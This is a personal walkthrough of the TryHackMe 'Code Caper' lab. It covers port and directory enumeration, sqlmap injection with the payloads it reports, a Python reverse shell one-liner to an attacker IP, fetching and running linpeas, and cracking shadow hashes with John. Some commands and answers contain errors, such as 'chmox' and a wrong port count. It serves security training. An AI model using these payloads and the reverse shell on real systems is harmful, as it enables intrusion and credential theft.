# TryHackMe - The Code Caper

## 🛠 Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.83.79
```

## 📌 Task 2: Enumerate

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Q. How many ports are open on the target machine?
A. 1

**Q. What is the http-title of the web server?
A. Apache2 Ubuntu Default Page: It works


**Q. What version is the ssh service?
A. OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

**Q. What is the version of the web server?
A. Apache/h.t.tp


## 📌 Task 3: Web Enumeration

**Q. What is the name of the important file on the server?
A. administrator.php

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.83.79 -x .php,.txt,.html
```

**Results**
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 10918]
/administrator.php    (Status: 200) [Size: 409]
```

## 📌 Task 4: Web Xploitation

```bash
sqlmap --forms -a --dbms=mysql -u http://10.10.83.79/administrator.php 
```

Lesson learnt. Never. Ever use -a, the output takes forever! --dump is much better

**Results**
```
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+
```

**Q. What is the admin username?
A.

**Q. What is the admin password?
A. 


**Q. How many forms of SQLI is the form vulnerable to?
A. 

```bash
sqlmap --forms -a --dbms=mysql -u http://10.10.83.79/administrator.php 
```
**Results**
```
	Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=Kspk' RLIKE (SELECT (CASE WHEN (1601=1601) THEN 0x4b73706b ELSE 0x28 END))-- yedd&password=BVzl

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=Kspk' AND GTID_SUBSET(CONCAT(0x717a6b7871,(SELECT (ELT(4491=4491,1))),0x7171706b71),4491)-- bidH&password=BVzl

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=Kspk' AND (SELECT 7037 FROM (SELECT(SLEEP(5)))YOCD)-- PfkO&password=BVzl```
```

## 📌 Task 5: Command Execution

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.57.121",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


**Q. How many files are in the current directory?
A. 

**Q. Do I still have an account
A> yes Check /etc/passwd

**Q. What is my ssh password?
A. 

Yikes! 
```bash
find / -type f -user pipngu 2>/dev/null
find / -type f -group pipngu 2>/dev/null
find / -type f -name *pass* 2>/dev/null
```
So many!!!

I tried the ones that seemed obvious. Before I landed on /var/hidden/pass

```bash
cat /var/hidden/pass
```

**Result**
```
pinguapingu
```

## 📌 Task 6: LinuxEnum

Lets ssh into the box as pingu
```bash
ssh pingu@10.10.83.79
```

Lets pull down linpeas.sh

**On attacker box

```bash
cp /usr/share/peas/linpeas/linpeas.sh .
python -m http.server 8888
```

**On target box
```bash
mktemp -d
cd <temp>
wget http://10.2.57.121/8888/linpeas.sh
chmox +x linpeas.sh
./linpeas.sh
```

**results**
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                             
-r-sr-xr-x 1 root papa 7.4K Jan 16  2020 /opt/secret/root (Unknown SUID binary!)              
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                       
-rwsr-xr-x 1 root root 11K May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                      
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 419K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)                                                       
-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                     
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
```

**Q. What is the interesting path of the interesting suid file
A. /opt/secret/root


## 📌 Task 7: pwndbg

```bash
gdb /opt/secret/root
```

**Q. Read the above :)

## 📌 Task 8: Binary-Exploitaion: Manually

**Q. Woohoo!

## 📌 Task 9: Binary Exploitation: The pwntools way

**Q. Even more woohoo!

** Bingo. Shadow password list!


## 📌 Task 10: Finishing the job

Lets use john the ripper

1. Copy and paste the shadow file to a file on your attacher pc called shadow. 
2. Then grab the passwd list from the hacked machine and paste into a file called passwd
3. Unshadow the passwords
4. Use John the ripper with rockyou.txt wordlist

```bash
nano shadow
nano passwd
unshadow passwd shadow > johnpasswd
john johnpasswd --wordlist=/usr/shae/wordlists/rockyou.txt
```

***results***
```
postman          (papa)     
love2fish        (root)   
```

**Q. What is the root password!
A.love2fish


## 📌 Task 11: Thanks You!

**Q. You helped me out!
